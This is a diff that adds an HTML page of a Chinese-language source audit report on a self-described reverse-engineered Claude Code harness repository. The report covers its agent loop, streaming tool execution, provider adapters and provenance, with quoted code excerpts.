@@ -1,0 +1,2163 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta name="description" content="Claude Code（复原） Coding Agent Harness 固定提交源码审计">
+  <title>Claude Code（复原） Harness 源码原理报告</title>
+  <link rel="stylesheet" href="../assets/report.css">
+</head>
+<body class="">
+  <div class="reading-progress" aria-hidden="true"></div>
+  
+  <aside class="rail">
+    <a class="brand" href="../index.html"><span class="brand-mark">H</span><span>HARNESS<br><small>源码研究院</small></span></a>
+    <nav aria-label="报告导航">
+      <a class="" href="../index.html">横向总览</a>
+      <a class="" href="../reports/goose.html"><span>01</span>Goose</a><a class="" href="../reports/aider.html"><span>02</span>Aider</a><a class="" href="../reports/grok-build.html"><span>03</span>Grok Build</a><a class="" href="../reports/openinterpreter.html"><span>04</span>Open Interpreter</a><a class="" href="../reports/little-coder.html"><span>05</span>Little Coder</a><a class="" href="../reports/monkeycode.html"><span>06</span>MonkeyCode</a><a class="" href="../reports/opencode.html"><span>07</span>OpenCode</a><a class="" href="../reports/oh-my-pi.html"><span>08</span>Oh My Pi</a><a class="active" href="../reports/claude-code.html"><span>09</span>Claude Code（复原）</a><a class="" href="../reports/pi.html"><span>10</span>Pi</a><a class="" href="../reports/codex.html"><span>11</span>OpenAI Codex</a><a class="" href="../reports/gemini-cli.html"><span>12</span>Gemini CLI</a><a class="" href="../reports/jcode.html"><span>13</span>JCode</a><a class="" href="../reports/kimi-cli.html"><span>14</span>Kimi CLI</a><a class="" href="../reports/deepseek-reasonix.html"><span>15</span>DeepSeek-Reasonix</a><a class="" href="../reports/codewhale.html"><span>16</span>CodeWhale</a><a class="" href="../reports/prime-agent.html"><span>17</span>Prime Agent</a><a class="" href="../reports/deepagents.html"><span>18</span>DeepAgents</a>
+    </nav>
+    <div class="rail-foot">SOURCE-LOCKED<br>2026 EDITION</div>
+  </aside>
+  <main class="page">
+    
+  <header class="report-hero">
+    <div class="hero-topline"><span>CODING AGENT HARNESS · SOURCE AUDIT</span><span>REPORT 09 / 18</span></div>
+    <div class="hero-grid">
+      <div>
+        <div class="hero-index">09</div>
+        <h1>Claude Code（复原）</h1>
+        <p class="hero-thesis">从复原源码可见极深的权限、上下文和子 Agent 设计；但来源与许可边界使其不能等同官方源码。</p>
+        <div class="hero-tags"><span>JS · Reconstructed Claude Harness</span><span>MIT</span><span>main</span></div>
+      </div>
+      <div class="snapshot-card">
+        <div class="seal">SOURCE<br>VERIFIED</div>
+        <dl>
+          <div><dt>Repository</dt><dd>claude-code-best/claude-code</dd></div>
+          <div><dt>Commit</dt><dd><code>53f347d34666e847405714095020afdfadb95503</code></dd></div>
+          <div><dt>Commit date</dt><dd>2026-07-27T00:20:42Z</dd></div>
+          <div><dt>Findings</dt><dd>25</dd></div>
+          <div><dt>Citations</dt><dd>79</dd></div>
+          <div><dt>Tracked files</dt><dd>3,546</dd></div>
+        </dl>
+      </div>
+    </div>
+    <div class="hero-actions">
+      <a href="https://github.com/claude-code-best/claude-code/tree/53f347d34666e847405714095020afdfadb95503">固定源码快照 ↗</a>
+      <a href="../tutorials/claude-code.html">进入小白教程 →</a>
+      <a href="../index.html#matrix">查看横向矩阵</a>
+      <label class="search-box"><span>⌕</span><input type="search" placeholder="搜索本报告结论与源码…" data-report-search></label>
+    </div>
+  </header>
+
+  <section class="executive chapter" id="executive">
+    <div class="chapter-kicker">EXECUTIVE READING</div>
+    <h2>先给结论，再进入源码</h2>
+    <div class="executive-grid">
+      <div class="thesis-card"><span>核心机制</span><p>持续消息变换；流中提前工具；补齐不完整 result</p></div>
+      <div class="thesis-card"><span>上下文</span><p>snip→tool slimming→memory→autocompact 阶梯</p></div>
+      <div class="thesis-card risk-tone"><span>安全边界</span><p>真实适配但默认关闭；包装失败可继续无沙箱</p></div>
+      <div class="thesis-card"><span>适用建设</span><p>研究 Claude Code 机制与多 Agent/权限设计</p></div>
+    </div>
+    <div class="pros-cons">
+      <div><h3>值得借鉴</h3><ul><li>权限流水线层次深</li><li>子 Agent 隔离语义丰富</li><li>长上下文恢复阶梯完整</li></ul></div>
+      <div><h3>需要警惕</h3><ul><li>非官方复原</li><li>默认沙箱关闭且 fail-open</li><li>采用与许可风险高</li></ul></div>
+      <div><h3>直接带走</h3><ul><li>无头 Agent fail-closed</li><li>subagent sidechain</li><li>多级压缩熔断</li></ul></div>
+    </div>
+  </section>
+
+  
+  <section class="chapter methodology" id="method">
+    <div class="chapter-kicker">00 · METHOD</div>
+    <h2>研究口径：先锁提交，再沿运行链读代码</h2>
+    <div class="method-grid">
+      <div><span>README POLICY</span><p>README/AGENTS 只用于确认仓库自述与入口；实现结论来自 query loop、API adapter、compact、permission、sandbox、MCP、AgentTool、plugin、session 和测试源码。</p></div>
+      <div><span>FACT POLICY</span><p>该仓库明确自述为反编译/复原版本；所有事实仅适用于本固定提交，绝不把它当成 Anthropic 官方 Claude Code 源码。</p></div>
+      <div><span>INFERENCE POLICY</span><p>严格区分实现存在、feature gate 可达、默认启用和外部依赖内部行为；空实现、空 beta header 与 ant-only 分支都按限制项处理。</p></div>
+    </div>
+    <div class="evidence-scale">
+      <div><b>L1</b><span>运行实现</span></div>
+      <div><b>L2</b><span>接口契约</span></div>
+      <div><b>L3</b><span>测试证明</span></div>
+      <div><b>L4</b><span>文档佐证</span></div>
+      <div><b>L5</b><span>明确推断</span></div>
+    </div>
+    <p class="method-note">本页引用 26 个不同源码/测试文件；证据角色分布：证据 3 · 实现 60 · 配置 4 · 证据 3 · Prompt 1 · 证据 1 · 证据 1 · 证据 1 · 契约 2 · 测试 3。代码块是固定提交中的原文截取，长区间仅在中部折叠，首尾行号保持真实。</p>
+  </section>
+
+  <section class="chapter diagrams" id="diagrams">
+    <div class="chapter-kicker">01 · TECHNICAL MAPS</div>
+    <h2>架构总图与单轮执行链路</h2>
+    <p class="chapter-deck">两张图均由本页证据账本生成，并通过 Archify showcase 9 项校验（0 error / 0 warning）。图可单独打开、搜索、缩放和追踪关系。</p>
+    <div class="diagram-stack">
+      <figure>
+        <figcaption><span>FIGURE 01</span><b>Claude Code（复原） Harness 架构图</b><a href="../diagrams/claude-code-architecture.html">全屏打开 ↗</a></figcaption>
+        <iframe src="../diagrams/claude-code-architecture.html" title="Claude Code（复原） 架构图" loading="lazy"></iframe>
+      </figure>
+      <figure>
+        <figcaption><span>FIGURE 02</span><b>用户输入到工具回写的技术链路</b><a href="../diagrams/claude-code-sequence.html">全屏打开 ↗</a></figcaption>
+        <iframe src="../diagrams/claude-code-sequence.html" title="Claude Code（复原） 技术链路图" loading="lazy"></iframe>
+      </figure>
+    </div>
+  </section>
+
+  <section class="chapter coverage" id="coverage">
+    <div class="chapter-kicker">02 · COVERAGE MAP</div>
+    <h2>审计维度与证据等级</h2>
+    <div class="coverage-table">
+    <div class="coverage-row">
+      <span>源码来源与成熟度</span>
+      <b>verified</b>
+      <em>L2 / L3</em>
+      <p>确认反编译/复原属性、stub 密度、测试规模和根许可证缺失。</p>
+    </div>
+    <div class="coverage-row">
+      <span>架构与 Agent Loop</span>
+      <b>verified</b>
+      <em>L1 / L2 / L3</em>
+      <p>审计 query 主循环、streaming tool execution、重试、缺失 tool result 修复与 stop hook。</p>
+    </div>
+    <div class="coverage-row">
+      <span>Provider、流式与重试</span>
+      <b>verified</b>
+      <em>L1 / L2</em>
+      <p>审计 Anthropic 主路径、Bedrock/Vertex 相关参数和本 fork 增加的 OpenAI/Gemini/Grok adapter。</p>
+    </div>
+    <div class="coverage-row">
+      <span>上下文、压缩与恢复</span>
+      <b>verified</b>
+      <em>L1 / L2 / L3</em>
+      <p>审计 snip、microcompact、autocompact、session memory、reactive compact 与阈值/熔断。</p>
+    </div>
+    <div class="coverage-row">
+      <span>工具、编辑与执行</span>
+      <b>verified</b>
+      <em>L1 / L2</em>
+      <p>审计内建与 MCP 工具池、稳定排序、动态工具发现和运行中执行。</p>
+    </div>
+    <div class="coverage-row">
+      <span>权限、审批与沙箱</span>
+      <b>verified</b>
+      <em>L1 / L2 / L3</em>
+      <p>审计规则优先级、模式、hook/classifier、无头行为与可选 OS sandbox。</p>
+    </div>
+    <div class="coverage-row">
+      <span>MCP 与连接器</span>
+      <b>verified</b>
+      <em>L1 / L2</em>
+      <p>审计 stdio/SSE/HTTP/WebSocket/proxy、OAuth、超时、重连、工具/资源与企业策略。</p>
+    </div>
+    <div class="coverage-row">
+      <span>指令、Skills 与插件</span>
+      <b>verified</b>
+      <em>L1 / L2</em>
+      <p>审计 CLAUDE.md、skill 延迟发现、plugin manifest、commands/agents/skills/hooks 与信任来源。</p>
+    </div>
+    <div class="coverage-row">
+      <span>子 Agent 与协作</span>
+      <b>verified</b>
+      <em>L1 / L2 / L3</em>
+      <p>审计 sync/async、fork、worktree、agent memory/MCP/hooks、resume、coordinator/swarm 分支。</p>
+    </div>
+    <div class="coverage-row">
+      <span>会话与观测</span>
+      <b>verified</b>
+      <em>L1 / L2 / L3</em>
+      <p>审计 JSONL parentUuid 链、sidechain、file snapshots、OTEL、Perfetto、Langfuse 与 stub analytics 边界。</p>
+    </div></div>
+  </section>
+
+  <div class="evidence-root">
+    
+    <section class="chapter evidence-chapter" id="dim-1">
+      <div class="chapter-rule"><span>01</span></div>
+      <div class="chapter-kicker">DIMENSION · PROVENANCE-MATURITY</div>
+      <h2>源码来源与成熟度</h2>
+      <p class="chapter-deck">本章共 2 个可定位结论；结论按“实现事实 → 白话解释 → 工程影响 → 源码摘录”展开。</p>
+      
+  <article class="finding" id="claude-code-provenance-001" data-search="这是反编译/复原仓库，不是 anthropic 官方 claude code 源码 仓库自己的 agents.md 明确称其为 reverse-engineered/decompiled 版本，目标是恢复核心功能并裁剪次要能力，同时承认很多模块是 stub 或由 feature flag 关闭。 它像依据成品拆机后复原出的工程图，能研究结构，但不能把每一处细节当成原厂图纸。 provenance-maturity">
+    <header class="finding-head">
+      <div class="finding-no">01</div>
+      <div>
+        <div class="eyebrow"><span class="level">L2</span><span>限制</span><span>claude-code-provenance-001</span></div>
+        <h3>这是反编译/复原仓库，不是 Anthropic 官方 Claude Code 源码</h3>
+      </div>
+    </header>
+    <div class="finding-grid">
+      <div class="analysis-copy">
+        <div class="fact-block"><span class="mini-label">源码事实</span><p>仓库自己的 AGENTS.md 明确称其为 reverse-engineered/decompiled 版本，目标是恢复核心功能并裁剪次要能力，同时承认很多模块是 stub 或由 feature flag 关闭。</p></div>
+        <div class="plain-block"><span class="mini-label">白话解释</span><p>它像依据成品拆机后复原出的工程图，能研究结构，但不能把每一处细节当成原厂图纸。</p></div>
+        <div class="impact-block"><span class="mini-label">对自研 Harness 的含义</span><p>报告可评价这个固定提交的实现，但任何对官方产品内部机制的映射都必须标注为推断。</p></div>
+        
+      </div>
+      <div class="code-card">
+        <div class="code-head">
+          <span>关键源码 · 证据</span>
+          <button class="copy-code" type="button" aria-label="复制代码">复制</button>
+        </div>
+        <div class="code-path">AGENTS.md · L1–L8</div>
+        <pre><code>    1  # CLAUDE.md
+    2  
+    3  This file provides guidance to Claude Code (claude.ai/code) and other AI coding agents when working with code in this repository.
+    4  
+    5  ## Project Overview
+    6  
+    7  This is a **reverse-engineered / decompiled** version of Anthropic&#39;s official Claude Code CLI tool. The goal is to restore core functionality while trimming secondary capabilities. Many modules are stubbed or feature-flagged off. TypeScript strict mode is enforced — **`bunx tsc --noEmit` must pass with zero errors**.
+    8  </code></pre>
+      </div>
+    </div>
+    <details class="evidence-list">
+      <summary>查看全部 2 处证据</summary>
+      <ul>
+    <li>
+      <span class="role">证据</span>
+      <code>AGENTS.md:1–8</code>
+      <span>仓库自述为 reverse-engineered/decompiled，并承认 stub/feature-off。</span>
+    </li>
+    <li>
+      <span class="role">证据</span>
+      <code>AGENTS.md:252–264</code>
+      <span>列出恢复、空实现与简化模块。</span>
+    </li></ul>
+    </details>
+  </article>
+  <article class="finding" id="claude-code-maturity-001" data-search="测试很多，但复原完整度和许可边界仍是采用门槛 固定提交包含 449 个 test/spec 文件，其中 src/packages 有 442 个；仓库内仍有大量 stub/todo/feature gate 命中，且根目录未见仓库级 license。 它不是玩具项目，回归网很大；但“测得多”不能消除拆机复原缺件和法律授权不明确的问题。 provenance-maturity">
+    <header class="finding-head">
+      <div class="finding-no">02</div>
+      <div>
+        <div class="eyebrow"><span class="level">L3</span><span>限制</span><span>claude-code-maturity-001</span></div>
+        <h3>测试很多，但复原完整度和许可边界仍是采用门槛</h3>
+      </div>
+    </header>
+    <div class="finding-grid">
+      <div class="analysis-copy">
+        <div class="fact-block"><span class="mini-label">源码事实</span><p>固定提交包含 449 个 test/spec 文件，其中 src/packages 有 442 个；仓库内仍有大量 stub/TODO/feature gate 命中，且根目录未见仓库级 LICENSE。</p></div>
+        <div class="plain-block"><span class="mini-label">白话解释</span><p>它不是玩具项目，回归网很大；但“测得多”不能消除拆机复原缺件和法律授权不明确的问题。</p></div>
+        <div class="impact-block"><span class="mini-label">对自研 Harness 的含义</span><p>适合作为研究样本和实现线索，不宜直接作为企业产品基座；若复用代码必须单独做许可证与来源审查。</p></div>
+        
+      </div>
+      <div class="code-card">
+        <div class="code-head">
+          <span>关键源码 · 测试</span>
+          <button class="copy-code" type="button" aria-label="复制代码">复制</button>
+        </div>
+        <div class="code-path">src/services/compact/__tests__/snipCompact.test.ts · L1–L80</div>
+        <pre><code>    1  import { describe, expect, test } from &#39;bun:test&#39;
+    2  import {
+    3    isSnipMarkerMessage,
+    4    isSnipRuntimeEnabled,
+    5    shouldNudgeForSnips,
+    6    snipCompactIfNeeded,
+    7    SNIP_NUDGE_TEXT,
+    8  } from &#39;../snipCompact.js&#39;
+    9  import type { Message } from &#39;src/types/message.js&#39;
+   10  
+   11  // --- Helpers ---
+   12  
+   13  function makeMessage(uuid: string, type: Message[&#39;type&#39;] = &#39;user&#39;): Message {
+   14    return {
+   15      type,
+   16      uuid,
+   17      message: {
+   18        role: type === &#39;user&#39; ? &#39;user&#39; : &#39;assistant&#39;,
+   19        content: `Message ${uuid}`,
+   20      },
+   21    } as Message
+   22  }
+   23  
+   24  function makeSystemMessage(
+      … 46 lines omitted; exact range 1–80 …
+   71      expect(isSnipRuntimeEnabled()).toBe(true)
+   72    })
+   73  })
+   74  
+   75  // --- shouldNudgeForSnips ---
+   76  
+   77  describe(&#39;shouldNudgeForSnips&#39;, () =&gt; {
+   78    test(&#39;returns false for short conversation&#39;, () =&gt; {
+   79      const msgs = Array.from({ length: 10 }, (_, i) =&gt; makeMessage(`u${i}`))
+   80      expect(shouldNudgeForSnips(msgs)).toBe(false)</code></pre>
+      </div>
+    </div>
+    <details class="evidence-list">
+      <summary>查看全部 4 处证据</summary>
+      <ul>
+    <li>
+      <span class="role">测试</span>
+      <code>src/services/compact/__tests__/snipCompact.test.ts:1–80</code>
+      <span>上下文剪裁行为测试样本。</span>
+    </li>
+    <li>
+      <span class="role">测试</span>
+      <code>src/utils/permissions/__tests__/permissions.test.ts:1–80</code>
+      <span>权限流水线测试样本。</span>
+    </li>
+    <li>
+      <span class="role">测试</span>
+      <code>packages/builtin-tools/src/tools/AgentTool/__tests__/resumeAgent.test.ts:1–20</code>
+      <span>子 Agent 恢复测试样本。</span>
+    </li>
+    <li>
+      <span class="role">证据</span>
+      <code>AGENTS.md:5–8</code>
+      <span>复原目标与 stub 声明。</span>
+    </li></ul>
+    </details>
+  </article>
+    </section>
+    <section class="chapter evidence-chapter" id="dim-2">
+      <div class="chapter-rule"><span>02</span></div>
+      <div class="chapter-kicker">DIMENSION · ARCHITECTURE-LOOP</div>
+      <h2>架构与 Agent Loop</h2>
+      <p class="chapter-deck">本章共 2 个可定位结论；结论按“实现事实 → 白话解释 → 工程影响 → 源码摘录”展开。</p>
+      
+  <article class="finding" id="claude-code-loop-001" data-search="主 harness 是一个持续循环的消息变换与工具执行流水线 query.ts 在 while(true) 中依次做工具结果预算、snip、microcompact、context collapse/autocompact、api streaming、工具执行、错误恢复和 stop hook；下一轮把 assistant/tool result 继续并回消息历史。 每一轮不是“问一次模型就结束”，而是先整理行李、调用模型、执行动作、把结果记账，再决定继续还是停。 architecture-loop">
+    <header class="finding-head">
+      <div class="finding-no">03</div>
+      <div>
+        <div class="eyebrow"><span class="level">L1</span><span>事实</span><span>claude-code-loop-001</span></div>
+        <h3>主 Harness 是一个持续循环的消息变换与工具执行流水线</h3>
+      </div>
+    </header>
+    <div class="finding-grid">
+      <div class="analysis-copy">
+        <div class="fact-block"><span class="mini-label">源码事实</span><p>query.ts 在 while(true) 中依次做工具结果预算、snip、microcompact、context collapse/autocompact、API streaming、工具执行、错误恢复和 stop hook；下一轮把 assistant/tool result 继续并回消息历史。</p></div>
+        <div class="plain-block"><span class="mini-label">白话解释</span><p>每一轮不是“问一次模型就结束”，而是先整理行李、调用模型、执行动作、把结果记账，再决定继续还是停。</p></div>
+        <div class="impact-block"><span class="mini-label">对自研 Harness 的含义</span><p>上下文、工具、权限和恢复都在同一编排循环交汇，修改其中任何一步都可能影响缓存与 transcript 一致性。</p></div>
+        
+      </div>
+      <div class="code-card">
+        <div class="code-head">
+          <span>关键源码 · 实现</span>
+          <button class="copy-code" type="button" aria-label="复制代码">复制</button>
+        </div>
+        <div class="code-path">src/query.ts · L460–L666</div>
+        <pre><code>  460    while (true) {
+  461      // Destructure state at the top of each iteration. toolUseContext alone
+  462      // is reassigned within an iteration (queryTracking, messages updates);
+  463      // the rest are read-only between continue sites.
+  464      let { toolUseContext } = state
+  465      const {
+  466        messages,
+  467        autoCompactTracking,
+  468        maxOutputTokensRecoveryCount,
+  469        hasAttemptedReactiveCompact,
+  470        maxOutputTokensOverride,
+  471        pendingToolUseSummary,
+  472        stopHookActive,
+  473        turnCount,
+  474      } = state
+  475  
+  476      // Skill discovery prefetch — per-iteration (uses findWritePivot guard
+  477      // that returns early on non-write iterations). Discovery runs while the
+  478      // model streams and tools execute; awaited post-tools alongside the
+  479      // memory prefetch consume. Replaces the blocking assistant_turn path
+  480      // that ran inside getAttachmentMessages (97% of those calls found
+  481      // nothing in prod). Turn-0 user-input discovery still blocks in
+  482      // userInputAttachments — that&#39;s the one signal where there&#39;s no prior
+  483      // work to hide under.
+      … 173 lines omitted; exact range 460–666 …
+  657          userContext,
+  658          systemContext,
+  659          toolUseContext,
+  660          forkContextMessages: messagesForQuery,
+  661        },
+  662        querySource,
+  663        tracking,
+  664        snipTokensFreed,
+  665      )
+  666      queryCheckpoint(&#39;query_autocompact_end&#39;)</code></pre>
+      </div>
+    </div>
+    <details class="evidence-list">
+      <summary>查看全部 3 处证据</summary>
+      <ul>
+    <li>
+      <span class="role">实现</span>
+      <code>src/query.ts:460–666</code>
+      <span>主循环和压缩前置流水线。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>src/query.ts:668–882</code>
+      <span>响应状态、硬上限和预测压缩。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>src/query.ts:1557–1803</code>
+      <span>stop hooks、工具结果和续跑控制。</span>
+    </li></ul>
+    </details>
+  </article>
+  <article class="finding" id="claude-code-loop-002" data-search="工具可以随流式响应提前启动，并补齐协议不完整的 tool result query.ts 在 content block 尚流式到达时创建 tool executor，收到完整 tool_use 后启动权限与执行；若 assistant 生成了工具调用但对应结果缺失，会合成错误 tool_result 维持 api 配对。 模型还在吐后续内容时，已经完整的工具参数可以先开工；账本缺一张回执时，系统会补一张失败回执，避免下一轮 api 拒绝整段对话。 architecture-loop">
+    <header class="finding-head">
+      <div class="finding-no">04</div>
+      <div>
+        <div class="eyebrow"><span class="level">L1</span><span>事实</span><span>claude-code-loop-002</span></div>
+        <h3>工具可以随流式响应提前启动，并补齐协议不完整的 tool result</h3>
+      </div>
+    </header>
+    <div class="finding-grid">
+      <div class="analysis-copy">
+        <div class="fact-block"><span class="mini-label">源码事实</span><p>query.ts 在 content block 尚流式到达时创建 tool executor，收到完整 tool_use 后启动权限与执行；若 assistant 生成了工具调用但对应结果缺失，会合成错误 tool_result 维持 API 配对。</p></div>
+        <div class="plain-block"><span class="mini-label">白话解释</span><p>模型还在吐后续内容时，已经完整的工具参数可以先开工；账本缺一张回执时，系统会补一张失败回执，避免下一轮 API 拒绝整段对话。</p></div>
+        <div class="impact-block"><span class="mini-label">对自研 Harness 的含义</span><p>降低工具启动延迟并提高恢复性，但要求工具调用去重、取消和消息顺序非常严谨。</p></div>
+        
+      </div>
+      <div class="code-card">
+        <div class="code-head">
+          <span>关键源码 · 实现</span>
+          <button class="copy-code" type="button" aria-label="复制代码">复制</button>
+        </div>
+        <div class="code-path">src/query.ts · L971–L1124</div>
+        <pre><code>  971                // Discard pending results from the failed streaming attempt and create
+  972                // a fresh executor. This prevents orphan tool_results (with old tool_use_ids)
+  973                // from being yielded after the fallback response arrives.
+  974                if (streamingToolExecutor) {
+  975                  streamingToolExecutor.discard()
+  976                  streamingToolExecutor = new StreamingToolExecutor(
+  977                    toolUseContext.options.tools,
+  978                    canUseTool,
+  979                    toolUseContext,
+  980                  )
+  981                }
+  982              }
+  983              // Backfill tool_use inputs on a cloned message before yield so
+  984              // SDK stream output and transcript serialization see legacy/derived
+  985              // fields. The original `message` is left untouched for
+  986              // assistantMessages.push below — it flows back to the API and
+  987              // mutating it would break prompt caching (byte mismatch).
+  988              let yieldMessage: typeof message = message
+  989              if (message.type === &#39;assistant&#39;) {
+  990                const assistantMsg = message as AssistantMessage
+  991                const contentArr = Array.isArray(assistantMsg.message?.content)
+  992                  ? (assistantMsg.message.content as unknown as Array&lt;{
+  993                      type: string
+  994                      input?: unknown
+      … 120 lines omitted; exact range 971–1124 …
+ 1115                        toolUseContext.options.tools,
+ 1116                      ).filter(_ =&gt; _.type === &#39;user&#39;),
+ 1117                    )
+ 1118                  }
+ 1119                }
+ 1120              }
+ 1121            }
+ 1122            queryCheckpoint(&#39;query_api_streaming_end&#39;)
+ 1123  
+ 1124            // Yield deferred microcompact boundary message using actual API-reported</code></pre>
+      </div>
+    </div>
+    <details class="evidence-list">
+      <summary>查看全部 3 处证据</summary>
+      <ul>
+    <li>
+      <span class="role">实现</span>
+      <code>src/query.ts:971–1124</code>
+      <span>streaming tool executor 与 tool_use backfill。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>src/query.ts:1158–1245</code>
+      <span>缺失 tool_result 合成与结果归并。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>src/services/api/claude.ts:1321–1325</code>
+      <span>发请求前再次修复 tool_use/tool_result 配对。</span>
+    </li></ul>
+    </details>
+  </article>
+    </section>
+    <section class="chapter evidence-chapter" id="dim-3">
+      <div class="chapter-rule"><span>03</span></div>
+      <div class="chapter-kicker">DIMENSION · PROVIDER-STREAMING-RETRY</div>
+      <h2>Provider、流式与重试</h2>
+      <p class="chapter-deck">本章共 2 个可定位结论；结论按“实现事实 → 白话解释 → 工程影响 → 源码摘录”展开。</p>
+      
+  <article class="finding" id="claude-code-provider-001" data-search="共享预处理之后按 provider 分流，anthropic 仍是最深的主路径 消息规范化、工具过滤、配对修复和媒体裁剪后，openai、gemini、grok 进入各自 adapter；其余路径继续构造 anthropic beta messages 参数，bedrock 追加特有 beta/body。 先把所有方言共有的消息账本整理好，再交给各家的翻译器；anthropic 方言拥有最完整的缓存、thinking 和 beta 功能。 provider-streaming-retry">
+    <header class="finding-head">
+      <div class="finding-no">05</div>
+      <div>
+        <div class="eyebrow"><span class="level">L1</span><span>事实</span><span>claude-code-provider-001</span></div>
+        <h3>共享预处理之后按 Provider 分流，Anthropic 仍是最深的主路径</h3>
+      </div>
+    </header>
+    <div class="finding-grid">
+      <div class="analysis-copy">
+        <div class="fact-block"><span class="mini-label">源码事实</span><p>消息规范化、工具过滤、配对修复和媒体裁剪后，openai、gemini、grok 进入各自 adapter；其余路径继续构造 Anthropic beta messages 参数，Bedrock 追加特有 beta/body。</p></div>
+        <div class="plain-block"><span class="mini-label">白话解释</span><p>先把所有方言共有的消息账本整理好，再交给各家的翻译器；Anthropic 方言拥有最完整的缓存、thinking 和 beta 功能。</p></div>
+        <div class="impact-block"><span class="mini-label">对自研 Harness 的含义</span><p>多模型可用性强，但新增兼容层不自动获得 Anthropic 路径全部语义，必须独立做工具与 usage 回归。</p></div>
+        
+      </div>
+      <div class="code-card">
+        <div class="code-head">
+          <span>关键源码 · 实现</span>
+          <button class="copy-code" type="button" aria-label="复制代码">复制</button>
+        </div>
+        <div class="code-path">src/services/api/claude.ts · L1282–L1338</div>
+        <pre><code> 1282    // Normalize messages before building system prompt (needed for fingerprinting)
+ 1283    // Instrumentation: Track message count before normalization
+ 1284    logEvent(&#39;tengu_api_before_normalize&#39;, {
+ 1285      preNormalizedMessageCount: messages.length,
+ 1286    })
+ 1287  
+ 1288    queryCheckpoint(&#39;query_message_normalization_start&#39;)
+ 1289    let messagesForAPI = normalizeMessagesForAPI(messages, filteredTools)
+ 1290    queryCheckpoint(&#39;query_message_normalization_end&#39;)
+ 1291  
+ 1292    // Model-specific post-processing: strip tool-search-specific fields if the
+ 1293    // selected model doesn&#39;t support tool search.
+ 1294    //
+ 1295    // Why is this needed in addition to normalizeMessagesForAPI?
+ 1296    // - normalizeMessagesForAPI uses isSearchExtraToolsEnabledNoModelCheck() because it&#39;s
+ 1297    //   called from ~20 places (analytics, feedback, sharing, etc.), many of which
+ 1298    //   don&#39;t have model context. Adding model to its signature would be a large refactor.
+ 1299    // - This post-processing uses the model-aware isSearchExtraToolsEnabled() check
+ 1300    // - This handles mid-conversation model switching (e.g., Sonnet → Haiku) where
+ 1301    //   stale tool-search fields from the previous model would cause 400 errors
+ 1302    //
+ 1303    // Note: For assistant messages, normalizeMessagesForAPI already normalized the
+ 1304    // tool inputs, so stripCallerFieldFromAssistantMessage only needs to remove the
+ 1305    // &#39;caller&#39; field (not re-normalize inputs).
+      … 23 lines omitted; exact range 1282–1338 …
+ 1329    }
+ 1330  
+ 1331    // Strip excess media items before making the API call.
+ 1332    // The API rejects requests with &gt;100 media items but returns a confusing error.
+ 1333    // Rather than erroring (which is hard to recover from in Cowork/CCD), we
+ 1334    // silently drop the oldest media items to stay within the limit.
+ 1335    messagesForAPI = stripExcessMediaItems(
+ 1336      messagesForAPI,
+ 1337      API_MAX_MEDIA_PER_REQUEST,
+ 1338    )</code></pre>
+      </div>
+    </div>
+    <details class="evidence-list">
+      <summary>查看全部 3 处证据</summary>
+      <ul>
+    <li>
+      <span class="role">实现</span>
+      <code>src/services/api/claude.ts:1282–1338</code>
+      <span>共享消息预处理。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>src/services/api/claude.ts:1340–1381</code>
+      <span>OpenAI/Gemini/Grok adapter 分流。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>src/services/api/claude.ts:1635–1640</code>
+      <span>Bedrock 特有参数。</span>
+    </li></ul>
+    </details>
+  </article>
+  <article class="finding" id="claude-code-provider-002" data-search="流式异常可退回非流式请求，且为 fallback 设置独立超时 api 层检测无 message_start、无完整 content block、idle 或 streaming error，按开关选择非流式 fallback；fallback 有单次有界超时，并把失败关联回原 streaming request。 流式通道卡住时会换普通请求再试，不让“无限等待”成为默认恢复策略。 provider-streaming-retry">
+    <header class="finding-head">
+      <div class="finding-no">06</div>
+      <div>
+        <div class="eyebrow"><span class="level">L1</span><span>事实</span><span>claude-code-provider-002</span></div>
+        <h3>流式异常可退回非流式请求，且为 fallback 设置独立超时</h3>
+      </div>
+    </header>
+    <div class="finding-grid">
+      <div class="analysis-copy">
+        <div class="fact-block"><span class="mini-label">源码事实</span><p>API 层检测无 message_start、无完整 content block、idle 或 streaming error，按开关选择非流式 fallback；fallback 有单次有界超时，并把失败关联回原 streaming request。</p></div>
+        <div class="plain-block"><span class="mini-label">白话解释</span><p>流式通道卡住时会换普通请求再试，不让“无限等待”成为默认恢复策略。</p></div>
+        <div class="impact-block"><span class="mini-label">对自研 Harness 的含义</span><p>交互韧性较高；但若工具已经由流式路径提前启动，重复请求可能产生双执行风险，所以代码也提供禁用该 fallback 的门。</p></div>
+        
+      </div>
+      <div class="code-card">
+        <div class="code-head">
+          <span>关键源码 · 实现</span>
+          <button class="copy-code" type="button" aria-label="复制代码">复制</button>
+        </div>
+        <div class="code-path">src/services/api/claude.ts · L818–L925</div>
+        <pre><code>  818   * Per-attempt timeout for non-streaming fallback requests, in milliseconds.
+  819   * Reads API_TIMEOUT_MS when set so slow backends and the streaming path
+  820   * share the same ceiling.
+  821   *
+  822   * Remote sessions default to 120s to stay under CCR&#39;s container idle-kill
+  823   * (~5min) so a hung fallback to a wedged backend surfaces a clean
+  824   * APIConnectionTimeoutError instead of stalling past SIGKILL.
+  825   *
+  826   * Otherwise defaults to 300s — long enough for slow backends without
+  827   * approaching the API&#39;s 10-minute non-streaming boundary.
+  828   */
+  829  function getNonstreamingFallbackTimeoutMs(): number {
+  830    const override = parseInt(process.env.API_TIMEOUT_MS || &#39;&#39;, 10)
+  831    if (override) return override
+  832    return isEnvTruthy(process.env.CLAUDE_CODE_REMOTE) ? 120_000 : 300_000
+  833  }
+  834  
+  835  /**
+  836   * Helper generator for non-streaming API requests.
+  837   * Encapsulates the common pattern of creating a withRetry generator,
+  838   * iterating to yield system messages, and returning the final BetaMessage.
+  839   */
+  840  export async function* executeNonStreamingRequest(
+  841    clientOptions: {
+      … 74 lines omitted; exact range 818–925 …
+  916        }
+  917      },
+  918      {
+  919        model: retryOptions.model,
+  920        fallbackModel: retryOptions.fallbackModel,
+  921        thinkingConfig: retryOptions.thinkingConfig,
+  922        ...(isFastModeEnabled() &amp;&amp; { fastMode: retryOptions.fastMode }),
+  923        signal: retryOptions.signal,
